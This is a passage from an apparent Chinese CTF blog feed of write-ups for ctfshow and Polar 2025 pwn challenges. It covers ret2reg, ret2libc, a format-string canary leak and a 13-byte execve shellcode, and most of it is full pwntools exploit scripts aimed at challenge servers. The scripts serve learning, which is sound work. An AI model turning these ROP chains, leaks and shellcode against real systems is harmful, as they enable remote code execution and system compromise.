class="number">0</span>)+p64(pop_rdi)+p64(bss)+p64(syscall_ret)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn79-ret2reg"><a href="#pwn79-ret2reg" class="headerlink" title="pwn79 ret2reg"></a>pwn79 ret2reg</h1><h2 id="ret2reg原理"><a href="#ret2reg原理" class="headerlink" title="ret2reg原理"></a>ret2reg原理</h2><ol><li>查看溢出函返回时哪个寄存值指向溢出缓冲区空间</li><li>查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址</li><li>reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)</li></ol><p>reg也就对应着rax rdi这些寄存器他们有可能指向栈上，此时栈上又是可执行的就可以在不泄露栈地址的情况下执行栈上内容</p><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure><p>栈上可执行</p><p>main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> input[<span class="number">512</span>]; <span class="comment">// [esp+0h] [ebp-808h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+800h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  init();</span><br><span class="line">  logo();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your input: &quot;</span>);</span><br><span class="line">  fgets(input, <span class="number">2048</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  ctfshow(input);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fgets不够覆盖到ebp控制执行流但是ctfshow中有个strcpy将input的内容复制到buf中存在溢出可以控制执行流</p><p>ctfshow</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">ctfshow</span><span class="params">(<span class="type">char</span> *input)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">512</span>]; <span class="comment">// [esp+0h] [ebp-208h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(buf, input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/79.png" alt="1"></p><p>通过gdb调试发现在ctfshow函数leave ret时eax ecx edx均指向栈上，如果能找到call eax这类gadget就可以执行栈上内容</p><p>刚好这题有call eax</p><p>所以整体思路：在栈上布置shellcode，利用strcpy溢出控制执行流执行call rax进而调用栈上shellcode</p><h1 id="pwn81"><a href="#pwn81" class="headerlink" title="pwn81"></a>pwn81</h1><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *handle; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Maybe it&#x27;s simple,O.o&quot;</span>);</span><br><span class="line">  handle = dlopen(<span class="string">&quot;libc.so.6&quot;</span>, <span class="number">258</span>);</span><br><span class="line">  v3 = dlsym(handle, <span class="string">&quot;system&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, v3);</span><br><span class="line">  ctfshow();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello CTFshow!\n&quot;</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以延迟绑定符号可搜索的形式打开一个共享库也就是动态链接的libc文件，后续用dlsym搜索出system函数地址并存入v3中用printf输出</p><p>ctfshow中有栈溢出漏洞，可溢出字节数很多</p><p>因为给了system的地址可以直接获得libc基地址所以elf基地址不知道也没关系</p><p>libc：<a href="https://libc.blukat.me/?q=system:420&l=libc6_2.27-3ubuntu1.6_amd64">libc database search</a></p><p>完整exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"><span class="title function_">context</span><span class="params">(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28217</span>)</span><br><span class="line"><span class="meta">#io = process(</span></span><br><span class="line">#    [<span class="string">&quot;/home/pwn/桌面/ld.so.2&quot;</span>, <span class="string">&quot;./pwn&quot;</span>],</span><br><span class="line"><span class="meta">#    env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: <span class="string">&quot;/home/pwn/桌面/libc.so.6&quot;</span>&#125;,</span></span><br><span class="line">#)</span><br><span class="line"><span class="meta">#io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./1.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line"><span class="meta">#sleep(1)</span></span><br><span class="line">io.recvuntil(b<span class="number">&#x27;</span>,O.o\n<span class="number">&#x27;</span>)</span><br><span class="line">system =<span class="type">int</span>(io.recvline(),<span class="number">16</span>)</span><br><span class="line">print(hex(system))</span><br><span class="line">libc_base = system - libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + next(libc.search(b<span class="number">&#x27;</span>/bin/sh<span class="number">&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x2164f</span></span><br><span class="line">ret = libc_base + <span class="number">0x21E25</span></span><br><span class="line">payload = b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*(<span class="number">0x80</span>+<span class="number">0x8</span>)+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn82-ret2dlresolve"><a href="#pwn82-ret2dlresolve" class="headerlink" title="pwn82 ret2dlresolve"></a>pwn82 ret2dlresolve</h1><p>第一种打法直接32位libc但是这题是学姿势的例题</p><p>libc：<a href="https://libc.blukat.me/?q=write:7f0&l=libc6-i386_2.27-3ubuntu1.6_amd64">libc database search</a></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28296</span>)</span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./1.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_edx_esi_edi_ebp = <span class="number">0x08048628</span></span><br><span class="line">show = elf.sym[<span class="string">&#x27;show&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>)+p32(write_plt)+p32(show)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_addrs = u32(io.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addrs))</span><br><span class="line">libc_base = write_addrs - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>)+p32(system)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>第二种打法ret2dlresolve见ret2dlresolve这篇文章</p>]]></content>
      
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>polar2025春季赛 wp</title>
      <link href="/2025/03/23/polar2025%E6%98%A5%E5%AD%A3%E8%B5%9Bwp/"/>
      <url>/2025/03/23/polar2025%E6%98%A5%E5%AD%A3%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次polarD&amp;N上pwn方向上的题都挺好的，进一步学习了canary绕过也发现了自己的很多问题（看得懂知识的不知道怎么实际来打等）</p><h2 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h2><p>一题简单的ret2libc，也是当天唯一出的一题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">jiu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">58</span>]; <span class="comment">// [esp+Eh] [ebp-3Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;like&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//有栈溢出漏洞</span></span><br></pre></td></tr></table></figure><p>程序动态链接，开了nx没开canary有puts函数直接puts泄露libc即可</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2148</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x3A</span>+<span class="number">4</span>)+p32(puts_plt)+p32(main)+p32(puts_got)</span><br><span class="line"></span><br><span class="line">io.recvline(<span class="string">&#x27;like&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts=u32(io.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line"></span><br><span class="line">libc_base=puts-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x3A</span>+<span class="number">4</span>)+p32(system)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>选出来的libc为1 - libc6-i386_2.23-0ubuntu11.3_amd64</p><h2 id="fmt-text"><a href="#fmt-text" class="headerlink" title="fmt_text"></a>fmt_text</h2><p>简单的格式化字符串漏洞泄露canary</p><p>32位程序，开启了nx和canary</p><p>漏洞函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">yichu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+8h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现printf出存在格式化字符串漏洞，可以用该处泄露canary</p><p>先测试格式化字符的偏移</p><p>第一次输入aaaa%x-%x-%x-%x-%x-%x-%x（其中%x用于以16进制形式输出整数值）</p><p>其中a的16进制表示为61故由下图可知格式化字符的偏移为6。</p><p><img src="/../images/polarwp/fmt.png" alt="1"></p><p>canary的位置距离栈顶的位置是0x70-0xC&#x3D;0x64，32位程序则为0x64&#x2F;4&#x3D;25，故想要输出canary需要25+6个%x，该题提供了system函数但是没有&#x2F;bin&#x2F;sh需要我们构造rop链输入进去，有了canary就可以开始利用第二个gets构造rop链了</p><p>gdb中用vmmap找到了一段可读写的区域用于存放&#x2F;bin&#x2F;sh</p><p><img src="/../images/polarwp/fmt1.png" alt="1"></p><p>但是直接放置在0x804a000会发现打不通，打开ida看才发现如果放在0x804a000的话就会覆盖掉部分got.plt表导致最后shell无法执行，所以只能放置bss段即0804A080(还是位于可读写的段上的)</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#conn = remote(&#x27;1.95.36.136&#x27;,2087)</span></span><br><span class="line"></span><br><span class="line">conn = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss=<span class="number">0x804a080</span></span><br><span class="line">ret=<span class="number">0x080486eb</span></span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">get_plt=elf.plt[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">payload_1 = <span class="string">b&#x27;%31$x&#x27;</span>    <span class="comment">#该条指令含义为以十六进制形式输出第31个数据即为canary</span></span><br><span class="line"></span><br><span class="line">conn.sendline(payload_1)</span><br><span class="line"></span><br><span class="line">recvbytes = conn.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取canary</span></span><br><span class="line">canary = <span class="built_in">int</span>(recvbytes, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Canary: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 第二次溢出</span></span><br><span class="line">payload_2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">0xc</span>) + p32(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(get_plt)+p32(system)+p32(bss)+p32(bss)</span><br><span class="line">conn.sendline(payload_2)</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>) <span class="comment">#记得加上\x00截断，放置误读参数无法正常get shell</span></span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h2 id="bllbl-shellcode-2"><a href="#bllbl-shellcode-2" class="headerlink" title="bllbl_shellcode_2"></a>bllbl_shellcode_2</h2><p>这题保护只开了部分RELRO还有可读写执行的段，结合题目自然想到了shellcode，发现程序有个jmp rsa，但是buf很小只有0x5的大小，可输入字节数也很少能写入shellcode的大小只有13(5+8(ebp))个字节所以联想到了栈迁移，用两次leave ret之类的扩展溢出字节数但是不会实操就卡住了</p><p>看了官方讲解后发现需要用这13个字节来达成execve(“&#x2F;bin&#x2F;sh\x00”,0,0)的调用</p><p>check：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn1&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>发现有RWX的段，保护只开了部分RELRO</p><p>IDA打开发现程序很简单，有一个明显溢出点，会输出栈顶地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">yichu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">5</span>]; <span class="comment">// [rsp+Bh] [rbp-5h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;addr1:%p\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402060);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">27uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>buf很小，可溢出字节数也很少5，能够构造shellcode的字节就只有</p><p>+8也就是buf大小+ebp&#x3D;13个字节接着将栈顶移到buf[0]上jmp rsp(程序中自带)</p><p>使用gdb调试来测试shellcode如何写</p><p>先运行该exp开启调试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&quot;node4.buuoj.cn&quot;, 25882)</span></span><br><span class="line">io=process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">buf_addr=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;buf_addr &gt;&gt;&gt; 0x%x&quot;</span> % buf_addr)</span><br><span class="line"></span><br><span class="line">jmp_rsp=<span class="number">0x401380</span></span><br><span class="line">bin_sh=<span class="number">0x402047</span></span><br><span class="line"></span><br><span class="line">shellcode= <span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span> <span class="comment">#13</span></span><br><span class="line">shellcode += p64(jmp_rsp)</span><br><span class="line">shellcode += asm(<span class="string">&quot;sub rsp, 0x15 ; jmp rsp&quot;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&quot;b* 0x0401376&quot;</span>)<span class="comment">#断点位于调用read后的leave处</span></span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">pause()<span class="comment">#暂停</span></span><br></pre></td></tr></table></figure><p>当运行到jmp rsp时，RSP指向sub rsp,0x15处</p><p>为什么是减去0x15呢？因为此时栈顶指向sub rsp,0x15这条压在栈上的指令，目前我有两种理解方式，第一种是通过调试发现在第一次jmp rsp时rsp指向sub rsp，xxx 这条汇编，该条汇编地址减去buf地址刚好是0x15，第二种理解是0x15&#x3D;5+8+8&#x3D;21也就是buf+rbp+返回地址的距离。</p><p>故rsp减去0x15后刚好指向buf处继续执行下一个jmp rsp调用shellcode。</p><p><img src="/../images/polarwp/blshellcode.png" alt="1"></p><p>想要达成execve(“&#x2F;bin&#x2F;sh,0,0”)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">需让rdi指向/bin/sh(题目中已给)</span><br><span class="line">rax=0x3b(execve的系统调用号)</span><br><span class="line">rsi=0</span><br><span class="line">rdx=0</span><br></pre></td></tr></table></figure><p>据调试可知目前rdi&#x3D;0</p><p>故可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov al,0x3b;小端序只改变低位寄存器来存储系统调用号</span><br><span class="line">mov esi,edi;将rsi置零为了更节省字符所以只改变低位寄存器</span><br><span class="line">mov edi,0x402047;/bin/sh</span><br><span class="line">mov edx,esi;将rdx置零为了更节省字符所以只改变低位寄存器</span><br><span class="line">syscall;系统调用</span><br></pre></td></tr></table></figure><h3 id="字节数计算："><a href="#字节数计算：" class="headerlink" title="字节数计算："></a>字节数计算：</h3><ol><li><code>mov al, 0x3b</code></li></ol><ul><li>操作码：<code>B0</code>（<code>mov r8, imm8</code>）</li><li>立即数：<code>3B</code></li><li>总字节数：2 字节</li></ul><ol start="2"><li><code>mov esi, edi</code></li></ol><ul><li>操作码：<code>89</code>（<code>mov r/m32, r32</code>）</li><li>ModR&#x2F;M 字节：<code>FE</code>（<code>esi</code> 是目标寄存器，<code>edi</code> 是源寄存器）</li><li>总字节数：2 字节</li></ul><ol start="3"><li><code>mov edi, 0x402047</code></li></ol><ul><li>操作码：<code>BF</code>（<code>mov r32, imm32</code>）</li><li>立即数：<code>47 20 40 